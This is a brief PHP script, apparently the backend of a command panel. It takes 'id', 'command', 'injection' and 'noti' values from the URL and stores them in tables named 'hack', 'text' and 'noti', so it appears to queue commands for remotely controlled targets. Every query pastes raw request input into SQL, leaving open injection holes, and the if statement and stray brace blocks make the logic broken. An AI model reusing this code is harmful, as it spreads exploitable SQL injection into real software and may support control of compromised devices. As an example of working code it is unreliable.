<?php
	include_once 'sql.php';
header ('Location:index.php');
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
} 
if( $_GET["id"] || $_GET["command"] || $_GET["injection"] || $_GET["noti"] )
$hek = $_GET["id"];
$command = $_GET["command"];
$path = $_GET["injection"];
$wal = $_GET["noti"];
{
    $sql = "UPDATE text SET text = '$path'";
}

if ($conn->query($sql) === TRUE) {
    echo "command send successfully";
} else {
    echo "Error updating record: " . $conn->error;
}

{
    $sql = "UPDATE hack SET command = '$command' WHERE `id` = '$hek'";
}

if ($conn->query($sql) === TRUE) {
    echo "command send successfully";
} else {
    echo "Error updating record: " . $conn->error;
}

{
    $sql = "UPDATE noti SET text = '$wal'";
}

if ($conn->query($sql) === TRUE) {
    echo "command send successfully";
} else {
    echo "Error updating record: " . $conn->error;
}

$conn->close();

?>